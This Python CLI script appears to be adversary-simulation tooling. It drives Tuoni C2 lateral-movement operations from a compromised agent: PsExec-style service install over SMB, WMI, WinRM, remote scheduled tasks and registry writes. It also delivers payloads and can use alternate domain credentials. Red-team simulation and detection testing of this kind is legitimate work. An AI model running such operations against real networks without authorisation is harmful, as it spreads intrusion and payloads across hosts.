#!/usr/bin/env python3
r"""Tuoni lateral movement — drive jump-* ops from an admin-context agent.

Operations (default: --op jump-service):
  jump-service   PsExec via SMB service create  — \pipe\svcctl (MS-SCMR)
  jump-wmi       WMI / DCOM Win32_Process.Create — TCP 135 + ephemeral
  jump-winrm     WinRM / WSMAN over HTTP/5985
  schtasks-remote  remote scheduled task via the generic cmd template
  reg-remote       remote registry write via the generic cmd template

Env:
  TUONI_API     base URL, e.g. https://<host>:8443       (required)
  TUONI_USER    Tuoni API user                           (required)
  TUONI_PASS    Tuoni API password                        (required)
  TUONI_AGENT   default source agent guid (overridden by --source)
  TARGET_IP     default --target (overridden by --target)

jump-* ops need --payload-id; resolve one with manage.py (--payload-type).

Importable from a notebook: tuoni_lateral() takes the same inputs as the CLI
flags as keyword arguments and returns a dict instead of only printing. It
raises TuoniScriptError on failure — argparse and sys.exit live only in main(); the core logic is in adsim.
"""
import argparse
import os
import random
import sys

from adsim.tuoni.common import TuoniScriptError
from adsim.tuoni.lateral import (
    CMD_OPS,
    OP_TEMPLATES,
    tuoni_lateral,
)


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--op", choices=list(OP_TEMPLATES.keys()) + list(CMD_OPS),
                    default="jump-service",
                    help="lateral op (default: jump-service)")
    ap.add_argument("--source", default=os.environ.get("TUONI_AGENT"),
                    help="source agent guid (default: first active)")
    ap.add_argument("--target", default=os.environ.get("TARGET_IP"),
                    help="target IP or hostname (required). "
                         "Env fallback: TARGET_IP.")
    ap.add_argument("--service-name", default=f"TuoniSim{random.randint(1000, 99999)}",
                    help="jump-service: SCM service name (default: TuoniSim<rand>)")
    ap.add_argument("--copy-path", default=None,
                    help="jump-*: destination path on the target, e.g. "
                         r"'C:\Windows\Tasks\Something.exe'. Unset means Tuoni "
                         "chooses.")
    ap.add_argument("--copy-method", default="SMB", choices=["SMB", "NONE"],
                    help="jump-service: payload copy method (default: SMB)")
    ap.add_argument("--cleanup", action=argparse.BooleanOptionalAction, default=True,
                    help="jump-service: delete service + binary after agent beacons")
    ap.add_argument("--username", default=None,
                    help="jump-service: alternate creds (DOMAIN\\user); "
                         "default uses agent's current token")
    ap.add_argument("--password", default=None,
                    help="jump-service: paired with --username")
    ap.add_argument("--payload-id", type=int, default=None,
                    help="jump-*: payload to deliver; its type must match the op "
                         "(jump-service SERVICE, jump-wmi/winrm EXECUTABLE)")
    ap.add_argument("--max-wait", type=int, default=180,
                    help="max seconds to wait for command done (default: 180)")
    args = ap.parse_args()
    if not args.target:
        ap.error("--target required (or set TARGET_IP env)")

    api = os.environ.get("TUONI_API")
    user = os.environ.get("TUONI_USER")
    password = os.environ.get("TUONI_PASS")

    try:
        if not api:
            raise TuoniScriptError("TUONI_API not set")
        if not (user and password):
            raise TuoniScriptError("TUONI_USER + TUONI_PASS not set")

        tuoni_lateral(
            op=args.op, api=api, user=user, password=password,
            source=args.source, target=args.target,
            service_name=args.service_name, copy_path=args.copy_path,
            copy_method=args.copy_method, cleanup=args.cleanup,
            username=args.username, target_password=args.password,
            max_wait=args.max_wait, payload_id=args.payload_id,
        )
    except TuoniScriptError as e:
        sys.exit(str(e))


if __name__ == "__main__":
    main()
